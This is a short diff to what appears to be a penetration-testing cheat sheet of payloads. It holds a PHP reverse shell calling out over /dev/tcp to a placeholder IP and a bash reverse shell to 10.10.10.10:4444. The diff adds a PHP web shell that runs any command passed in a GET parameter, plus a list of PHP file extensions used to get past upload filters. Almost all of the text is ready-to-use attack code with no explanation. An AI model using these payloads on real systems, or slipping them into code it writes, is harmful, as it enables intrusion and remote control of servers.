@@ -1,12 +1,16 @@
 PHP:
     <?php
     exec("/bin/bash -c 'bash -i >& /dev/tcp/<ip>/1234 0>&1'");
-    ?> 
+    ?>
+    
+    <?php
+    echo system($_GET["cmd"]);
+    ?>
 
 BASH:
     #!/bin/bash
     bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
 
-KALİ:
 
 
+PHP extensions :: phar,php1,php2,php3,php4,php5,phtml
